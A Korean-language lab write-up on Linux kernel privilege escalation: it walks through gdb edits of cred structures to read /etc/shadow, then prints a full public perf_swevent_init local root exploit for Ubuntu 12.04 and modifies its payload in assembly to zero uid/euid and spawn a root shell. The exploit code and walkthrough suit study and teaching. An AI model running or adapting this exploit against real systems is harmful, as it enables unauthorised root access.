
# Linux Kernel Exploit Development 3

## Introduction

* `prepare_kernel_cred()` 와 `commit_creds()`의 하드 코딩된 주소를 이용하자.<br>위의 함수들은 커널에 의해 export되고 그들의 주소는 동일 리눅스 배포 버전을 다운로드 및 설치 하거나 `/poc/kallsyms` 같은 특정 파일에 권한이 잘되어 있지 않은 경우 알아낼수있다.<br> 따라서 이런 함수들의 하드코딩된 주소들은 일반적으로 PoC code를 위해 사용된다.<br>
<br>

* `thread_info structure`의 주소를 찾기 위해 heuristic을 사용한다.<br>그리고 이 structure의 첫번째 포인터는 `task_struct`의 주소를 포함하고 있다.<br>`task_struct`는 `cred structure`의 주소를 가져 오는데 사용된다.<br>이것은 방대한 커널 버전들을 타겟으로 한 exploit을 하기위해 추천되는 방법이다.<br>
![stack](https://github.com/Kimdong0219/image/blob/master/stack.png?raw=true)
<br>

----

## Task 1

TestVM의 `./exercises/cred_struct`에서, `getuid syscall`을 사용하여 uid를 체크하는 간단한 `user-space program`을 찾을 수 있다.<br>

만약 uid가 0이라면, 이 프로그램은 `/etc/shadow`파일을 출력해줄 것이다.<br>

```c
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
int main() {
uid_t uid;
uid = getuid();
printf("my uid = %d\n", uid);
if (uid == 0)
system("cat /etc/shadow");
return 0;
}
```
<br>

**`sys_getuid`에 breakpoint를 걸고 `thread_info`의 주소를 계산해라.**<br>

**`cred structure`를 얻기위해 `typecasting`을 사용할 수 있고 필요한 필드를 0으로 세팅해라.**<br>

**결과물로 `uid=0`와 `/etc/shadow`파일을 출력해라!**<br>

### 분석 시작 <br>

`sys_getuid`의 code를 살펴보자.<br>

<b>https://elixir.bootlin.com/linux/v4.5/source/include/linux/syscalls.h#L225</b>

 <br>

```c
asmlinkage long sys_getuid(void);
```
<br>

`sys_getuid`에는 별도로 들어가는 인자가 없다.<br>

```c
   0xffffffff81065650 <+0>:	push   rbp
   0xffffffff81065651 <+1>:	mov    rbp,rsp
   0xffffffff81065654 <+4>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff81065659 <+9>:	mov    rax,QWORD PTR gs:0xc700
   0xffffffff81065662 <+18>:	mov    rax,QWORD PTR [rax+0x458]
   0xffffffff81065669 <+25>:	pop    rbp
   0xffffffff8106566a <+26>:	mov    eax,DWORD PTR [rax+0x4]
   0xffffffff8106566d <+29>:	cmp    eax,0xffffffff
   0xffffffff81065670 <+32>:	cmove  eax,DWORD PTR [rip+0xbc5259]    # 0xffffffff81c2a8d0 <overflowuid>
   0xffffffff81065677 <+39>:	mov    eax,eax
   0xffffffff81065679 <+41>:	ret
```
<br>

breakpoint를 `sys_getuid`에 걸어본다.<br>

![sys_getuid](https://github.com/Kimdong0219/image/blob/master/uid.png?raw=true)
<br>

```c
pwndbg> i r
rax            0x3e9	1001
rbx            0x0	0
rcx            0x7fff6fbb9450	140735067952208
rdx            0x7fff6fbb97c8	140735067953096
rsi            0x7fff6fbb97b8	140735067953080
```
<br>

`rax=0x3e9`의 값이 들어있는 것을 확인할 수 있다.<br>

 `0xffffffff81065659 <+9>:	mov    rax,QWORD PTR gs:0xc700`에서 보면 rax값이 gs:0xc700에서 들어오는 것으로 확인된다.<br>

 위의 그림에서 확인하듯이 `gs:0xc700`가 `task_struct`가 된다.<br>

breakpoint를 `sys_getuid+9`로 맞춰서 rax에 들어가는 task_struct를 `typecasting` 해보자.<br>

```c
pwndbg> i r
rax            0xffff880079a04500	-131939354786560 <== thread당 할당되기때문에 주소가 매번 다를수있다.
pwndbg> p (struct task_struct*)0xffff880079a04500
$1 = (struct task_struct *) 0xffff880079a04500
pwndbg> p *$1
$2 = {
  state = 0,
  stack = 0xffff880077e02000,
  usage = {
    counter = 2
  },
.....
real_cred = 0xffff880036db5d40 <== real_cred를 찾아야한다.
```
<br>

이렇게 `real_cred`의 주소를 얻어올수있다.<br>


다시 `real_cred`의 struct를 불러오자.<br>

 앞에서 task_struct가 \$1로 `typecasting`이 되었으므로 `$1.real_cred`로 부르면 된다.<br>

```c
pwndbg> p *$1.real_cred
$6 = {
  usage = {
    counter = 4
  },
  uid = 1001,
  gid = 1001,
  suid = 1001,
  sgid = 1001,
  euid = 1001,
  egid = 1001,
```
<br>

다음과 같이 `uid,gid,suid,sgid,euid,egid` 등등의 구조체안의 인자들을 확인할 수 있다.<br>

이제 `uid,gid,euid,egid`를 바꿔보자.<br>

```c
pwndbg> set $2.real_cred.uid=0
pwndbg> p *$2.real_cred
$9 = {
  usage = {
    counter = 4
  },
  uid = 0
```
real_cred.uid는 주소값이 아닌 자체적인 인자값이므로 (*)을 따로 붙이지 않고 바로 set해준다.<br>
같은 방식으로 `gid,euid,egid`를 바꿔보자.<br>
```c
pwndbg> set $2.real_cred.gid=0
pwndbg> set $2.real_cred.euid=0
pwndbg> set $2.real_cred.egid=0
pwndbg> p *$2.real_cred
uid = 0,
gid = 0,
euid = 0,
egid = 0,
```
**uid,gid,euid,egid가 모두 바뀌었다.**<br>

![shadow](https://github.com/Kimdong0219/image/blob/master/shadow.png?raw=true)

#### shadow 파일 출력!

----

## Task2

`./exercises/perf`에 Ubuntu 12.04 에서 `perf_swevent_init`를 이용한 exploit 코드가 있다.<br>

이 exploit은 TestVM에 설치된 kernel version에서 `escalate privileges`에 사용될수 있다.<br>

exploit을 컴파일 해서 `root shell`을 획득하라.<br>

이 exploit은 `commit_creds()`와 `prepare_kernel_cred()`에 hardcoded 된 주소를 사용한다.<br>

```c
/**
 * Ubuntu 12.04 3.x x86_64 perf_swevent_init Local root exploit
 * by Vitaly Nikolenko (vnik5287@gmail.com)
 *
 * based on semtex.c by sd
 *
 * Supported targets:
 * [0] Ubuntu 12.04.0 - 3.2.0-23-generic
 * [1] Ubuntu 12.04.1 - 3.2.0-29-generic
 * [2] Ubuntu 12.04.2 - 3.5.0-23-generic
 *
 * $ gcc vnik.c -O2 -o vnik
 *
 * $ uname -r
 * 3.2.0-23-generic
 *
 * $ ./vnik 0
 */

#define _GNU_SOURCE 1
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <syscall.h>
#include <stdint.h>
#include <assert.h>

#define BASE  0x1780000000
#define SIZE  0x0010000000
#define KSIZE 0x2000000
#define AB(x) ((uint64_t)((0xababababLL<<32)^((uint64_t)((x)*313337))))

typedef int __attribute__((regparm(3))) (*commit_creds_fn)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred_fn)(unsigned long cred);

uint64_t targets[3][3] =
            {{0xffffffff81ef67e0,  // perf_swevent_enabled
              0xffffffff81091630,  // commit_creds
              0xffffffff810918e0}, // prepare_kernel_cred
             {0xffffffff81ef67a0,
              0xffffffff81091220,
              0xffffffff810914d0},
             {0xffffffff81ef5940,
              0xffffffff8107ee30,
              0xffffffff8107f0c0}
	    };

void __attribute__((regparm(3))) payload() {
	uint32_t *fixptr = (void*)AB(1);
	// restore the handler
	*fixptr = -1;
	commit_creds_fn commit_creds = (commit_creds_fn)AB(2);
	prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)AB(3);
	commit_creds(prepare_kernel_cred((uint64_t)NULL));
}

void trigger(uint32_t off) {
	uint64_t buf[10] = { 0x4800000001, off, 0, 0, 0, 0x300 };
	int fd = syscall(298, buf, 0, -1, -1, 0);
	assert( !close(fd) );
}

int main(int argc, char **argv) {
	uint64_t off64, needle, kbase, *p;
	uint8_t *code;
	uint32_t int_n, j = 5, target = 1337;
	int offset = 0;
	void *map;

	assert(argc == 2 && "target?");
	assert( (target = atoi(argv[1])) < 3 );

	struct {
		uint16_t limit;
		uint64_t addr;
	} __attribute__((packed)) idt;

	// mmap user-space block so we don't page fault
	// on sw_perf_event_destroy
	assert((map = mmap((void*)BASE, SIZE, 3, 0x32, 0,0)) == (void*)BASE);
	memset(map, 0, SIZE);

	asm volatile("sidt %0" : "=m" (idt));
	kbase = idt.addr & 0xff000000;
	printf("IDT addr = 0x%lx\n", idt.addr);

	assert((code = (void*)mmap((void*)kbase, KSIZE, 7, 0x32, 0, 0)) == (void*)kbase);
	memset(code, 0x90, KSIZE); code += KSIZE-1024; memcpy(code, &payload, 1024);
	memcpy(code-13,"\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf", 13);

	// can only play with interrupts 3, 4 and 0x80
	for (int_n = 3; int_n <= 0x80; int_n++) {
		for (off64 = 0x00000000ffffffff; (int)off64 < 0; off64--) {
			int off32 = off64;

			if ((targets[target][0] + ((uint64_t)off32)*24) == (idt.addr + int_n*16 + 8)) {
				offset = off32;
				goto out;
			}
		}
		if (int_n == 4) {
			// shit, let's try 0x80 if the kernel is compiled with
			// CONFIG_IA32_EMULATION
			int_n = 0x80 - 1;
		}
	}
out:
	assert(offset);
	printf("Using int = %d with offset = %d\n", int_n, offset);

	for (j = 0; j < 3; j++) {
		needle = AB(j+1);
		assert(p = memmem(code, 1024, &needle, 8));
		*p = !j ? (idt.addr + int_n * 16 + 8) : targets[target][j];
	}
	trigger(offset);
	switch (int_n) {
	case 3:
		asm volatile("int $0x03");
		break;
	case 4:
		asm volatile("int $0x04");
		break;
	case 0x80:
		asm volatile("int $0x80");
	}

	assert(!setuid(0));
	return execl("/bin/bash", "-sh", NULL);
}

```
<br>

**하드코딩된 `commit_creds()`와 `prepare_kerenel_cred()`의 주소를 제거하기 위해 이 `payload()`함수를 이용해라.<br>
 `privilege escalation paylod`는 `stack pointer`를 획득 하고 13개 bit에 masking away를 해서 `cred structure`에 위치시켜라.**<br>
<br>

**- payload()**
```c
void __attribute__((regparm(3))) payload() {
	uint32_t *fixptr = (void*)AB(1);
	// restore the handler
	*fixptr = -1;
	commit_creds_fn commit_creds = (commit_creds_fn)AB(2);
	prepare_kernel_cred_fn prepare_kernel_cred = (prepare_kernel_cred_fn)AB(3);
	commit_creds(prepare_kernel_cred((uint64_t)NULL));
}
```
<br>

**- main()**

```c
for (j = 0; j < 3; j++) {
		needle = AB(j+1);
		assert(p = memmem(code, 1024, &needle, 8));
		*p = !j ? (idt.addr + int_n * 16 + 8) : targets[target][j];
	}
```
<br>

main문에서 j=0일시 `needle = AB(0);` 가 된다.<br>

target[0] = `perf_swevent_enabled`이다. <br>

`perf_swevent_enabled`는 `*fixptr`이라는 변수에 저장이 된다.<br>

`*fixptr =-1`으로 지정해주고 이루 commit_creds와 prepare_kernel_cred 주소를 가져와서 `commit_creds(prepare_kernel_cred(0));`을 해준다.<br>

`prepare_kernel_cred(Null)`을 해주면 `cred_struct` 구조체 안에 모든 값에 0이 들어가서 `uid,gid,euid,egid`등이 모두 0으로 바뀌게 된다.<br>

맨위의 그림에 있는 thread_info 구조체의 주소를 가져오자.<br>

`thread_info`의 주소는 `(r|e)sp & ~(THREAD_SIZE-1)`연산으로 구할수 있다.<br>

`thread_info`의 주소를 알아내면 typecasting을 하여 `task_struct` , `real_cred`까지 알아 낼수있다.<br>

```c
void trigger(uint32_t off) {
	uint64_t buf[10] = { 0x4800000001, off, 0, 0, 0, 0x300 };
	int fd = syscall(298, buf, 0, -1, -1, 0);
	assert( !close(fd) );
}
```
<br>
trigger 함수에서 `298번 syscall`을 트리거한다.<br>

<b> https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/ </b> <br>

298번 syscall은 `sys_perf_event_open`이다.<br>

```c
rdi: struct perf_event_attr *attr_uptr
rsi: pid_t pid
rdx: int cpu
r10: int group_fd
r8: unsigned long flags
```
<br>

이제 MasterVM에서 gdb로 TargetVM에 붙어보자.<br>

```c
<masterVM>

➜  ~ gdb -q kernels/vmlinux-3.5.0-23-generic
pwndbg: loaded 175 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from kernels/vmlinux-3.5.0-23-generic...done.
pwndbg> target remote 192.168.74.1:8864
Remote debugging using 192.168.74.1:8864
native_safe_halt () at /build/buildd/linux-lts-quantal-3.5.0/arch/x86/include/asm/irqflags.h:50

pwndbg> b *sys_perf_event_open
Breakpoint 1 at 0xffffffff811209d0: file /build/buildd/linux-lts-quantal-3.5.0/kernel/events/core.c, line 6198.
```
<br>

```c
<testVM>
test@ubuntu:~/exercises/perf$ ls
vnik_v1  vnik_v1.c
test@ubuntu:~/exercises/perf$ ./vnik_v1 2
IDT addr = 0xffffffff81dd6000
Using int = 4 with offset = -49077
```
<br>

```c
pwndbg> i r rsp
rsp            0xffff88007a715f80	0xffff88007a715f80
```

<br>

`thread_info`의 주소를 구하기위해 `rsp`의 값을 확인했다.<br>

`thread_info`의 주소는 ``(r|e)sp & ~(THREAD_SIZE-1)``이다.<br>

`THREAD_SIZE = 8K`이다.<br>

따라서 `thred_info`의 주소를 구해보자.<br>

```c
1024 * 8 => 8192 = 0x2000
~(0x2000 - 1) = 0xFFFFFFFFFFFFE000
RIP & ~(THREAD_SIZE -1) = 0xFFFF88007A714000
```
<br>

```c
pwndbg> p (struct thread_info *)0xFFFF88007A714000
$1 = (struct thread_info *) 0xffff88007a714000
pwndbg> p *$1
$2 = {
  task = 0xffff8800786a0000,
  exec_domain = 0xffffffff81c1f2e0 <default_exec_domain>,
  flags = 0,
  status = 0,
  cpu = 0,
  preempt_count = 0,
  addr_limit = {
    seg = 140737488351232
  },
  restart_block = {
    fn = 0xffffffff81069a40 <do_no_restart_syscall>,
    {
      futex = {
        uaddr = 0x0 <irq_stack_union>,
        val = 0,
        flags = 0,
        bitset = 0,
        time = 0,
        uaddr2 = 0x0 <irq_stack_union>
      },
      nanosleep = {
        clockid = 0,
        rmtp = 0x0 <irq_stack_union>,
        compat_rmtp = 0x0 <irq_stack_union>,
        expires = 0
      },
      poll = {
        ufds = 0x0 <irq_stack_union>,
        nfds = 0,
        has_timeout = 0,
        tv_sec = 0,
        tv_nsec = 0
      }
    }
  },
  sysenter_return = 0x0 <irq_stack_union>,
  sig_on_uaccess_error = 0,
  uaccess_err = 0
}
```
<br>

`thread_info`의 주소를 구했으니 그 안의 `task struct`를 확인해보자.<br>

```c
pwndbg> p *$1.task
$3 = {
  state = 0,
  stack = 0xffff88007a714000,
  usage = {
    counter = 2
  },
  flags = 4202496,
  ptrace = 0,
  wake_entry = {
    next = 0x0 <irq_stack_union>
  },
  on_cpu = 1,
  on_rq = 1,
  prio = 120,
  static_prio = 120,
  normal_prio = 120,
  rt_priority = 0,
  sched_class = 0xffffffff8180cca0 <fair_sched_class>,
  se = {
    load = {
      weight = 1024,
      inv_weight = 4194304
    },
.....
real_cred = 0xffff8800748c5740,
  cred = 0xffff8800748c5740,
.....
}
<br>
```

확인 해보니 `real_cred`의 주소가 확인이 되었다.<br>

`real_cred`구조체 안까지 확인해보자.<br>


 ```c
pwndbg> p *$1.task.real_cred
$4 = {
  usage = {
    counter = 3
  },
  uid = 1001,
  gid = 1001,
  suid = 1001,
  sgid = 1001,
  euid = 1001,
  egid = 1001,
  fsuid = 1001,
  fsgid = 1001,
 ```
<br>

이제 `real_cred`의 주소를 알아오는 식을 assmembly식으로 작성해보자.<br>

```c
pwndbg> disas sys_getuid
Dump of assembler code for function sys_getuid:
   0xffffffff81065650 <+0>:	push   rbp
   0xffffffff81065651 <+1>:	mov    rbp,rsp
   0xffffffff81065654 <+4>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff81065659 <+9>:	mov    rax,QWORD PTR gs:0xc700
   0xffffffff81065662 <+18>:	mov    rax,QWORD PTR [rax+0x458]
   0xffffffff81065669 <+25>:	pop    rbp
   0xffffffff8106566a <+26>:	mov    eax,DWORD PTR [rax+0x4]
   0xffffffff8106566d <+29>:	cmp    eax,0xffffffff
   0xffffffff81065670 <+32>:	cmove  eax,DWORD PTR [rip+0xbc5259]        # 0xffffffff81c2a8d0 <overflowuid>
   0xffffffff81065677 <+39>:	mov    eax,eax
   0xffffffff81065679 <+41>:	ret
```
<br>

일단 `thread_info`는 `gs:0xc700`에서 들어오고 그 다음에 rax_0x458에서 `real_cred`값이 들어오게 된다. <br>

그 후에 `rax+0x4`에서 uid값이 들어오게 된다.<br>

```c
pwndbg> disas sys_geteuid
Dump of assembler code for function sys_geteuid:
   0xffffffff81065680 <+0>:	push   rbp
   0xffffffff81065681 <+1>:	mov    rbp,rsp
   0xffffffff81065684 <+4>:	nop    DWORD PTR [rax+rax*1+0x0]
   0xffffffff81065689 <+9>:	mov    rax,QWORD PTR gs:0xc700
   0xffffffff81065692 <+18>:	mov    rax,QWORD PTR [rax+0x458]
   0xffffffff81065699 <+25>:	pop    rbp
   0xffffffff8106569a <+26>:	mov    eax,DWORD PTR [rax+0x14]
   0xffffffff8106569d <+29>:	cmp    eax,0xffffffff
   0xffffffff810656a0 <+32>:	cmove  eax,DWORD PTR [rip+0xbc5229]        # 0xffffffff81c2a8d0 <overflowuid>
   0xffffffff810656a7 <+39>:	mov    eax,eax
   0xffffffff810656a9 <+41>:	ret
End of assembler dump.
```
<br>

`euid`는 `rax+0x14`에서 불러온다.<br>

필요한 인자의 주소값은 다 구했으므로 assembly로 작성해보자.<br>

payload안에 내용을 아래와 같이 수정해주자.<br>

```c
void __attribute__((regparm(3))) payload() {
        asm(
                "movq $0xffffffffffffffff, 0xffffffff81ef5940;    # perf_event_enabled의 값을 -1로 set
                "movq %rsp, %rax;"    # rax에 rsp 값을 넣어준다
                "movq $0xFFFFFFFFFFFFE000, %rcx;"   # rcx에 THREAD_SIZE-1 값을 넣어준다.
                "andq %rcx, %rax;"    # rax와 rcx &연산
                "movq (%rax), %rcx;"    # rcx에 rax(task_struct)값 대입
                "movq 0x458(%rcx), %rax;"   # rax에 rax+0x458값(real_cred) 대입
                "movl $0, 0x04(%rax);"    # rax+0x04에 0(uid)대입
                "movl $0, 0x14(%rax);"    # rax+0x14에 0(euid)대입
                # 갓원영 코드 참고함
        );
}
```
<br>



주소값을 받아오는 과정을 자동화 시켰기 때문에 아래 함수를 삭제하자.<br>

```c
for (j = 0; j < 3 ; j++) {
	needle = AB(j+1);
	printf("j:      %x\n", j);
	printf("needle: %lx\n", needle);
	assert(p = memmem(code, 1024, &needle, 8));
	*p = !j ? (idt.addr + int_n * 16 + 8) : targets[target][j];
}
```
<br>

```c
test@ubuntu:~/exercises/perf$ ./vnik_v2 2
IDT addr = 0xffffffff81dd6000
Using int = 4 with offset = -49077
root@ubuntu:~/exercises/perf#
```
<br>

# End.

----
